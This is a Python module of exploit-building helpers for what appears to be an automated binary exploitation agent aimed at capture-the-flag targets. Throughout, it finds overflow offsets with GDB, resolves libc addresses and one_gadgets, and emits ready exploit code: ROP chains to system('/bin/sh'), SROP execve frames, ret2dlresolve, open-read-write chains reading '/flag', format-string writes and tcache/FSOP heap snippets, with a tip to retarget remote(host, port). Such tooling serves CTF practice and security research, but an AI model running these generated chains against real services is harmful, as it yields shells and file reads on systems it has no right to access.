"""Pwn-specific deterministic helpers.

These are the tools that turn PwnProof's triage into faster, more reliable
exploit construction: cyclic offsets, libc resolution, ROP/ORW/fmtstr plans,
heap layouts, seccomp inventory, GDB/GEF inspection, and disassembly.
"""

from __future__ import annotations

import json
import re
import struct
import sys
from pathlib import Path
from typing import Any

from .vendor.pwnproof.runtime import CommandResult, LinuxRuntime, shlex_quote
from .vendor.pwnproof.tools import heap_layout_facts
from .vendor.pwnproof.triage import BinaryFacts

PYTHON = "python3"


def _run(runtime: LinuxRuntime, command: str, timeout: int = 40) -> CommandResult:
    return runtime.run(command, timeout=timeout)


def _to_int(value: Any, default: int | None = None) -> int | None:
    if value is None or value == "":
        return default
    if isinstance(value, int):
        return value
    text = str(value).strip()
    try:
        return int(text, 0)
    except ValueError:
        return default


def _rel(workspace: Path, path: str | Path) -> str:
    candidate = Path(path)
    if not candidate.is_absolute():
        candidate = workspace / candidate
    candidate = candidate.resolve()
    try:
        return candidate.relative_to(workspace.resolve()).as_posix()
    except ValueError as exc:
        raise ValueError(f"path escapes workspace: {path}") from exc


def _linux_path(config: Any, runtime: LinuxRuntime, path: str | Path) -> str:
    """Return a shell-usable path: relative inside workspace, absolute otherwise."""
    raw = str(path)
    if runtime.mode == "wsl" and raw.startswith("/"):
        return raw
    candidate = Path(path)
    if not candidate.is_absolute():
        candidate = config.workspace / candidate
    candidate = candidate.resolve()
    try:
        return candidate.relative_to(config.workspace.resolve()).as_posix()
    except ValueError:
        return _wsl_path(candidate) if runtime.mode == "wsl" else str(candidate)


def _wsl_path(path: str | Path) -> str:
    if sys.platform != "win32":
        return str(path)
    resolved = str(Path(path).resolve())
    drive = Path(resolved).drive.rstrip(":")
    rest = resolved[len(Path(resolved).drive):].replace("\\", "/")
    return f"/mnt/{drive.lower()}{rest}"


# --------------------------------------------------------------------- cyclic
def _debruijn(k: int, n: int) -> list[int]:
    a = [0] * (k * n)
    sequence: list[int] = []

    def db(t: int, p: int) -> None:
        if t > n:
            if n % p == 0:
                sequence.extend(a[1 : p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return sequence


def cyclic(length: int = 512) -> bytes:
    """Printable de Bruijn pattern with unique 4-byte windows."""
    sequence = _debruijn(26, 4)
    alphabet = b"abcdefghijklmnopqrstuvwxyz"
    return bytes(alphabet[i] for i in sequence[: max(1, length)])


def find_offset(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    length: int = 512,
    input_mode: str = "line",
    binary: str | None = None,
    buffer_size: int | None = None,
) -> dict[str, Any]:
    workspace = config.workspace
    target = binary or config.binary.name
    pattern = cyclic(length)
    payload = pattern + (b"\n" if input_mode == "line" else b"")
    pattern_rel = ".pwnagent/pattern.bin"
    pattern_path = workspace / pattern_rel
    pattern_path.parent.mkdir(parents=True, exist_ok=True)
    pattern_path.write_bytes(payload)

    bits = facts.bits or 64
    stack_expr = "*(unsigned long*)$rsp" if bits == 64 else "*(unsigned int*)$esp"
    registers = "rip rsp" if bits == 64 else "eip esp"
    stack_reg = "$rsp" if bits == 64 else "$esp"
    script_rel = ".pwnagent/offset.gdb"
    script = (
        "set pagination off\n"
        "set confirm off\n"
        f"run < {pattern_rel}\n"
        f"info registers {registers}\n"
        f"p/x {stack_expr}\n"
        f"x/8{'gx' if bits == 64 else 'wx'} {stack_reg}\n"
    )
    (workspace / script_rel).write_text(script, encoding="utf-8")
    command = f"gdb -q -batch -x {shlex_quote(script_rel)} --args {shlex_quote(target)}"
    result = _run(runtime, command, timeout=50)
    text = result.combined
    value = None
    match = re.search(r"\b(rip|eip)\s+0x([0-9a-fA-F]+)", text)
    if match:
        value = int(match.group(2), 16)
    stack_value = None
    stack_match = re.search(r"\$\d+\s*=\s*0x([0-9a-fA-F]+)", text)
    if stack_match:
        stack_value = int(stack_match.group(1), 16)

    offset = None
    evidence = ""
    for candidate_value, label in ((value, "crash register"), (stack_value, "stack return slot")):
        if candidate_value is None:
            continue
        for width in (8, 6, 4):
            try:
                raw = candidate_value.to_bytes(width, "little")
            except OverflowError:
                continue
            index = pattern.find(raw)
            if index >= 0:
                offset = index
                evidence = f"{label}=0x{candidate_value:x}; matched {width}-byte pattern at {index}"
                break
        if offset is not None:
            break
    if offset is None and buffer_size is not None:
        offset = int(buffer_size) + (8 if bits == 64 else 4)
        evidence = f"buffer_size {buffer_size} + saved frame ({8 if bits == 64 else 4})"

    return {
        "ok": offset is not None,
        "offset": offset,
        "bits": bits,
        "register_value": f"0x{value:x}" if value is not None else None,
        "stack_value": f"0x{stack_value:x}" if stack_value is not None else None,
        "pattern": pattern_rel,
        "evidence": evidence,
        "gdb_tail": text[-3500:],
    }


# --------------------------------------------------------------------- libc
LIBC_WANTED = (
    "puts", "printf", "read", "write", "system", "execve", "open", "openat",
    "setcontext", "environ", "__free_hook", "__malloc_hook", "_IO_list_all",
    "_IO_2_1_stdout_", "_IO_2_1_stdin_", "_IO_wfile_jumps", "_IO_file_jumps",
)

_SYM_LINE = re.compile(
    r"^\s*\d+:\s+([0-9a-fA-F]+)\s+\d+\s+(FUNC|IFUNC|OBJECT|NOTYPE)\s+\S+\s+\S+\s+\S+\s+(\S+)"
)


def _parse_libc_symbols(text: str) -> dict[str, int]:
    symbols: dict[str, int] = {}
    for line in text.splitlines():
        match = _SYM_LINE.search(line)
        if not match:
            continue
        address, kind, raw_name = match.groups()
        name = raw_name.split("@", 1)[0]
        if name not in LIBC_WANTED:
            continue
        value = int(address, 16)
        if value and name not in symbols:
            symbols[name] = value
    return symbols


def _parse_release(text: str) -> str:
    match = re.search(r"GNU C Library[^\r\n]*?release\s+version\s+([0-9]+(?:\.[0-9]+)+)", text, re.I)
    if match:
        return match.group(1)
    match = re.search(r"glibc\s+([0-9]+(?:\.[0-9]+)+)", text, re.I)
    return match.group(1) if match else ""


def _sections(text: str) -> dict[str, str]:
    sections: dict[str, str] = {}
    current = ""
    for line in text.splitlines():
        match = re.fullmatch(r"\[([A-Z]+)]", line.strip())
        if match:
            current = match.group(1).lower()
            sections[current] = ""
        elif current:
            sections[current] += line + "\n"
    return sections


def libc_offsets(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    libc: str | None = None,
    leak: str | int | None = None,
    symbol: str = "puts",
) -> dict[str, Any]:
    workspace = config.workspace
    reference = libc or config.libc
    if not reference:
        for candidate in facts.libc_candidates:
            if candidate.path:
                reference = candidate.path
                break
    if not reference:
        reference = "libc.so.6"
    rel = _linux_path(config, runtime, reference)
    quoted = shlex_quote(rel)
    names = "|".join(LIBC_WANTED)

    command = (
        f"printf '[SYMS]\\n'; "
        f"readelf --dyn-syms -W {quoted} 2>/dev/null | grep -E ' ({names})(@@|@|$)' ; "
        f"readelf -sW {quoted} 2>/dev/null | grep -E ' ({names})(@@|@|$)' ; "
        f"printf '[RELEASE]\\n'; strings -a -n 7 {quoted} 2>/dev/null | "
        "grep -m1 -E 'GNU C Library|musl libc' || true; "
        f"printf '[BINSH]\\n'; {PYTHON} -c "
        f"\"from pwn import ELF; e=ELF('{rel}'); print(hex(next(e.search(b'/bin/sh'))))\" "
        "2>/dev/null || true; "
        f"printf '[ONEGADGET]\\n'; one_gadget {quoted} 2>/dev/null | head -80 || true"
    )
    result = _run(runtime, command, timeout=60)
    text = result.combined
    sections = _sections(text)
    symbols = _parse_libc_symbols(sections.get("syms", text))
    release = _parse_release(sections.get("release", text))
    binsh = None
    match = re.search(r"0x([0-9a-fA-F]+)", sections.get("binsh", ""))
    if match:
        binsh = int(match.group(1), 16)
    one_gadgets: list[dict[str, Any]] = []
    for line in sections.get("onegadget", "").splitlines():
        match = re.match(r"\s*(0x[0-9a-fA-F]+)\s+(.*)", line)
        if match:
            one_gadgets.append({"offset": match.group(1), "line": line.strip()[:300]})

    leak_value = _to_int(leak)
    base = None
    resolved: dict[str, int] = {}
    if leak_value is not None and symbol in symbols:
        candidate_base = leak_value - symbols[symbol]
        if candidate_base > 0 and candidate_base & 0xFFF == 0:
            base = candidate_base
            resolved = {name: base + offset for name, offset in symbols.items()}
            if binsh is not None:
                resolved["/bin/sh"] = base + binsh

    return {
        "ok": bool(symbols),
        "libc": rel,
        "release": release,
        "symbols": {name: f"0x{value:x}" for name, value in symbols.items()},
        "symbol_offsets": symbols,
        "binsh_offset": binsh,
        "base": hex(base) if base is not None else None,
        "resolved": {name: hex(value) for name, value in resolved.items()},
        "one_gadgets": one_gadgets[:6],
        "note": "Offsets are relative to the supplied libc; base is only computed when a leak and symbol are given.",
        "raw_tail": text[-2500:],
    }


def libc_match(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    leak: str | int,
    symbol: str = "puts",
    libc: str | None = None,
) -> dict[str, Any]:
    info = libc_offsets(config, runtime, facts, libc=libc, leak=leak, symbol=symbol)
    if not info["base"]:
        info["error"] = "leak did not yield a page-aligned libc base for this symbol/libc"
    return info


# --------------------------------------------------------------------- plans
def _resolve_gadget(text: str, wanted: str) -> int | None:
    for line in text.splitlines():
        if " : " not in line:
            continue
        address, gadget = line.split(" : ", 1)
        if gadget.strip() == wanted and address.strip().startswith("0x"):
            try:
                return int(address.strip(), 16)
            except ValueError:
                continue
    return None


def _gadgets(config: Any, runtime: LinuxRuntime, path: str, timeout: int = 60) -> dict[str, int]:
    rel = _linux_path(config, runtime, path)
    command = f"ROPgadget --binary {shlex_quote(rel)} --only 'pop|ret|syscall' 2>/dev/null | head -400"
    text = _run(runtime, command, timeout=timeout).stdout
    wanted = [
        "pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret", "pop rax ; ret",
        "syscall ; ret", "ret",
    ]
    out: dict[str, int] = {}
    for gadget in wanted:
        value = _resolve_gadget(text, gadget)
        if value is not None:
            out[gadget] = value
    return out


def fmtstr_plan(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    target: str | int,
    value: str | int = 0,
    index: int = 6,
    mode: str = "write",
    bits: int | None = None,
    write_size: str = "short",
) -> dict[str, Any]:
    bits = bits or facts.bits or 64
    target_value = _to_int(target)
    if target_value is None:
        raise ValueError("target address is required")
    pointer = "p64" if bits == 64 else "p32"
    if mode == "leak":
        code = f'''import os
from pwn import *
context.binary = ELF(os.environ["TARGET"], checksec=False)
target = {hex(target_value)}
payload = f"%{index}$s".encode().ljust({8 if bits == 64 else 4}, b"A") + {pointer}(target)
# send payload, receive one pointer-width of data, then unpack
'''
    else:
        code = f'''import os
from pwn import *
context.binary = ELF(os.environ["TARGET"], checksec=False)
payload = fmtstr_payload({index}, {{{hex(target_value)}: {_to_int(value) or 0}}}, write_size="{write_size}")
'''
    return {
        "ok": True,
        "mode": mode,
        "bits": bits,
        "index": index,
        "code": code,
        "notes": [
            "Find the stack argument index with a %p scan before writing.",
            "On x86-64, 8-byte pointers and payload alignment matter; keep writes short.",
            "If %N$ is filtered, use sequential %p/%n with a positional probe.",
        ],
    }


def rop_plan(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    goal: str = "system",
    libc: str | None = None,
    base: str | int = 0,
    offset: int = 72,
    writable: str | int = 0,
    path: str = "/flag",
) -> dict[str, Any]:
    bits = facts.bits or 64
    pointer = "p64" if bits == 64 else "p32"
    libc_info = libc_offsets(config, runtime, facts, libc=libc)
    symbols = libc_info["symbol_offsets"]
    if libc:
        gadgets = _gadgets(config, runtime, libc)
    else:
        gadgets = _gadgets(config, runtime, config.binary.name)
    base_value = _to_int(base) or 0
    addr = lambda name: base_value + symbols[name] if name in symbols else None

    code_lines = ["import os", "from pwn import *", "context.binary = ELF(os.environ['TARGET'], checksec=False)"]
    if goal == "system":

        required = ["system", "puts"]
        missing = [name for name in required if name not in symbols]
        if missing:
            return {"ok": False, "error": f"libc missing symbols: {missing}", "libc": libc_info}
        binsh = addr("/bin/sh")
        if binsh is None and libc_info.get("binsh_offset") is not None:
            binsh = base_value + libc_info["binsh_offset"]
        if bits == 32:
            if symbols.get("system") is None or binsh is None:
                return {"ok": False, "error": "missing system or /bin/sh offset", "libc": libc_info}
            code_lines += [
                f"base = {hex(base_value)}",
                f"system = base + {hex(symbols['system'])}",
                f"binsh = base + {hex(libc_info.get('binsh_offset') or 0)}",
                f"offset = {offset}",
                "chain = b'A' * offset + p32(system) + p32(0) + p32(binsh)",
            ]
            return {
                "ok": True,
                "goal": goal,
                "bits": bits,
                "gadgets": {},
                "libc": libc_info,
                "code": "\n".join(code_lines) + "\n",
                "notes": ["32-bit cdecl: system returns to the next word, argument follows.", "Verify the offset with `offset`."],
            }
        pop_rdi = gadgets.get("pop rdi ; ret")
        ret = gadgets.get("ret")
        if not pop_rdi or symbols.get("system") is None:
            return {"ok": False, "error": "missing pop rdi;ret or system offset", "gadgets": gadgets}
        code_lines += [
            f"base = {hex(base_value)}",
            f"pop_rdi = base + {hex(pop_rdi)}",
            f"system = base + {hex(symbols['system'])}",
            f"binsh = base + {hex(libc_info.get('binsh_offset') or 0)}",
            f"offset = {offset}",
            f"chain = b'A' * offset",
            f"chain += {pointer}(base + {hex(ret)}) if {bool(ret)} else b''",
            f"chain += {pointer}(pop_rdi) + {pointer}(binsh) + {pointer}(system)",
        ]
    elif goal == "srop":
        if "syscall ; ret" not in gadgets:
            return {"ok": False, "error": "SROP needs a syscall;ret gadget", "gadgets": gadgets, "libc": libc_info}
        syscall = gadgets["syscall ; ret"]
        binsh = libc_info.get("binsh_offset") or 0
        code_lines += [
            f"base = {hex(base_value)}",
            f"syscall = base + {hex(syscall)}",
            f"binsh = base + {hex(binsh)}",
            f"offset = {offset}",
            "frame = SigreturnFrame()",
            "frame.rax = 59",
            "frame.rdi = binsh",
            "frame.rsi = 0",
            "frame.rdx = 0",
            "frame.rip = syscall",
            "chain = b'A' * offset + p64(syscall) + bytes(frame)",
        ]
        return {
            "ok": True,
            "goal": goal,
            "bits": bits,
            "gadgets": {name: hex(value) for name, value in gadgets.items()},
            "libc": libc_info,
            "code": "\n".join(code_lines) + "\n",
            "notes": ["SROP requires a syscall;ret gadget and a known libc base.", "Set frame.rsp if you need a stack."],
        }
    elif goal == "ret2dlresolve":
        code_lines += [
            f"offset = {offset}",
            "rop = ROP(elf)",
            "dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])",
            "rop.read(0, dlresolve.data_addr)",
            "rop.ret2dlresolve(dlresolve)",
            "payload = b'A' * offset + rop.chain()",
            "# send payload, then send dlresolve.payload",
        ]
        return {
            "ok": True,
            "goal": goal,
            "bits": bits,
            "gadgets": {name: hex(value) for name, value in gadgets.items()},
            "libc": libc_info,
            "code": "\n".join(code_lines) + "\n",
            "notes": ["ret2dlresolve is for binaries lacking a libc leak/system path.", "Send dlresolve.payload after the ROP chain."],
        }
    elif goal in {"execve", "orw"}:
        needed = ["pop rax ; ret", "pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret", "syscall ; ret"]
        missing = [name for name in needed if name not in gadgets]
        if missing:
            return {"ok": False, "error": f"missing gadgets: {missing}", "gadgets": gadgets, "libc": libc_info}
        w = _to_int(writable) or 0x404000
        code_lines += [
            f"base = {hex(base_value)}",
            f"pop_rax = base + {hex(gadgets['pop rax ; ret'])}",
            f"pop_rdi = base + {hex(gadgets['pop rdi ; ret'])}",
            f"pop_rsi = base + {hex(gadgets['pop rsi ; ret'])}",
            f"pop_rdx = base + {hex(gadgets['pop rdx ; ret'])}",
            f"syscall = base + {hex(gadgets['syscall ; ret'])}",
            f"writable = {hex(w)}",
            f"path = {hex(w + 0x200)}",
            f"buf = {hex(w + 0x300)}",
            "rop = b''",
        ]
        if goal == "orw":
            code_lines += [
                "# open(path, O_RDONLY)",
                f"rop += {pointer}(pop_rax) + {pointer}(2) + {pointer}(pop_rdi) + {pointer}(path) + {pointer}(pop_rsi) + {pointer}(0) + {pointer}(pop_rdx) + {pointer}(0) + {pointer}(syscall)",
                "# read(3, buf, 0x100)",
                f"rop += {pointer}(pop_rax) + {pointer}(0) + {pointer}(pop_rdi) + {pointer}(3) + {pointer}(pop_rsi) + {pointer}(buf) + {pointer}(pop_rdx) + {pointer}(0x100) + {pointer}(syscall)",
                "# write(1, buf, 0x100)",
                f"rop += {pointer}(pop_rax) + {pointer}(1) + {pointer}(pop_rdi) + {pointer}(1) + {pointer}(pop_rsi) + {pointer}(buf) + {pointer}(pop_rdx) + {pointer}(0x100) + {pointer}(syscall)",
            ]
        else:
            code_lines += [
                "# execve('/bin/sh', 0, 0)",
                f"rop += {pointer}(pop_rax) + {pointer}(59) + {pointer}(pop_rdi) + {pointer}(path) + {pointer}(pop_rsi) + {pointer}(0) + {pointer}(pop_rdx) + {pointer}(0) + {pointer}(syscall)",
            ]
        code_lines += [f"chain = b'A' * {offset} + rop", "# write path at p64(path) before jumping"]
    else:
        return {"ok": False, "error": f"unsupported goal: {goal}"}

    return {
        "ok": True,
        "goal": goal,
        "bits": bits,
        "gadgets": {name: hex(value) for name, value in gadgets.items()},
        "libc": libc_info,
        "code": "\n".join(code_lines) + "\n",
        "notes": [
            "Verify the offset with `offset`; do not trust the default.",
            "For remote targets, replace process() with remote(host, port).",
            "If system crashes, insert one plain ret before it (movaps alignment).",
        ],
    }


def heap_plan(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    release: str = "",
    chunk_size: int | None = None,
    libc: str | None = None,
    goal: str = "tcache",
) -> dict[str, Any]:
    libc_info = libc_offsets(config, runtime, facts, libc=libc) if (libc or facts.libc_candidates) else {}
    symbols = libc_info.get("symbol_offsets", {})
    layout = heap_layout_facts(release or libc_info.get("release", ""), chunk_size)
    hooks = {name: hex(value) for name, value in symbols.items() if name in {"__free_hook", "__malloc_hook", "_IO_list_all", "_IO_wfile_jumps", "setcontext"}}
    snippet = ""
    if goal == "tcache":
        snippet = (
            "from pwn import *\n"
            "base = 0  # set from leak\n"
            f"target = base + {hooks.get('__free_hook', '0x0')}\n"
            "# encoded = target ^ (chunk_addr >> 12)  # safe-linking, glibc >= 2.32\n"
            "# free(controlled_chunk) twice, then overwrite next with encoded\n"
        )
    elif goal == "fsop":
        snippet = (
            "from pwn import *\n"
            "base = 0  # set from leak\n"
            f"io_list_all = base + {hooks.get('_IO_list_all', '0x0')}\n"
            "# forge FILE, set _IO_write_base=0/_IO_write_ptr=1/_chain=0/_mode=0\n"
            "# wide_data/vtable per heap_layout_facts; trigger exit or fflush\n"
        )
    return {
        "ok": True,
        "goal": goal,
        "layout": layout,
        "libc_release": libc_info.get("release", ""),
        "libc_symbols": hooks,
        "snippet": snippet,
        "notes": [
            "glibc >= 2.34 removed __free_hook/__malloc_hook in many builds; verify symbols.",
            "Use a runtime leak to derive the libc base; never hard-code an address.",
            "Check tcache count and safe-linking before every metadata write.",
        ],
    }


def _exec_ref(target: str) -> str:
    return target if "/" in target else "./" + target


def seccomp_inventory(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    binary: str | None = None,
    timeout: int = 8,
) -> dict[str, Any]:
    target = binary or config.binary.name
    rel = _rel(config.workspace, target)
    probe = _run(runtime, f"command -v seccomp-tools 2>/dev/null", timeout=10)
    available = probe.exit_code == 0
    if available:
        result = _run(runtime, f"timeout {timeout} seccomp-tools dump {shlex_quote(_exec_ref(rel))} 2>&1", timeout=timeout + 10)
        text = result.combined
        names = sorted(set(re.findall(r"\b(open|openat|read|write|execve|execveat|mprotect|mmap|exit|exit_group)\b", text)))
        if "no seccomp filter" in text.lower():
            recommendation = "no seccomp filter detected; execve/system likely usable"
        elif "execve" in names:
            recommendation = "execve appears allowed"
        else:
            recommendation = "ORW (open/read/write) or sandbox escape"
        return {
            "ok": True,
            "seccomp_tools": True,
            "allowed_names": names,
            "raw_tail": text[-4000:],
            "recommendation": recommendation,
        }
    imports = _run(runtime, f"readelf -sW {shlex_quote(rel)} 2>/dev/null | grep -E 'prctl|seccomp'", timeout=15)
    likely = bool(imports.stdout.strip())
    return {
        "ok": True,
        "seccomp_tools": False,
        "sandbox_imports": imports.stdout.strip().splitlines()[:10],
        "likely_sandbox": likely,
        "recommendation": "install seccomp-tools or inspect prctl/seccomp calls; assume ORW if execve is filtered",
    }


def debug_session(
    config: Any,
    runtime: LinuxRuntime,
    facts: BinaryFacts,
    *,
    input_path: str | None = None,
    breakpoint: str | None = None,
    commands: list[str] | None = None,
    timeout: int = 40,
) -> dict[str, Any]:
    target = config.binary.name
    lines = ["set pagination off", "set confirm off"]
    if config.gef_path:
        gef = _wsl_path(config.gef_path)
        lines.append(f'source "{gef}"')
    if breakpoint:
        lines.append(f"break {breakpoint}")
    if input_path:
        rel = _rel(config.workspace, input_path)
        lines.append(f"run < {rel}")
    else:
        lines.append("run")
    bits = facts.bits or 64
    stack_reg = "$rsp" if bits == 64 else "$esp"
    stack_fmt = "16gx" if bits == 64 else "16wx"
    lines += ["info registers", "bt", f"x/{stack_fmt} {stack_reg}"]
    lines += list(commands or [])
    script_rel = ".pwnagent/debug.gdb"
    (config.workspace / script_rel).write_text("\n".join(lines) + "\n", encoding="utf-8")
    command = f"gdb -q -batch -x {shlex_quote(script_rel)} --args {shlex_quote(_exec_ref(target))}"
    result = _run(runtime, command, timeout=timeout)
    text = result.combined
    return {
        "ok": result.exit_code == 0 or "Breakpoint" in text or "SIGSEGV" in text or "SIGABRT" in text,
        "exit_code": result.exit_code,
        "timed_out": result.timed_out,
        "gdb": text[-12000:],
    }


def disassemble(
    config: Any,
    runtime: LinuxRuntime,
    *,
    symbol: str | None = None,
    address: str | None = None,
    length: int = 60,
) -> dict[str, Any]:
    target = config.binary.name
    rel = _rel(config.workspace, target)
    if symbol:
        command = (
            f"objdump -d -Mintel --no-show-raw-insn {shlex_quote(rel)} | "
            f"sed -n '/<{symbol}>:/,+{max(1, length)}p'"
        )
    elif address:
        start = _to_int(address)
        if start is None:
            raise ValueError("address must be an integer")
        stop = start + max(1, length) * 8
        command = (
            f"objdump -d -Mintel --no-show-raw-insn --start-address={hex(start)} "
            f"--stop-address={hex(stop)} {shlex_quote(rel)}"
        )
    else:
        raise ValueError("symbol or address is required")
    result = _run(runtime, command, timeout=30)
    return {"ok": result.exit_code == 0, "lines": result.combined.splitlines()[:400]}
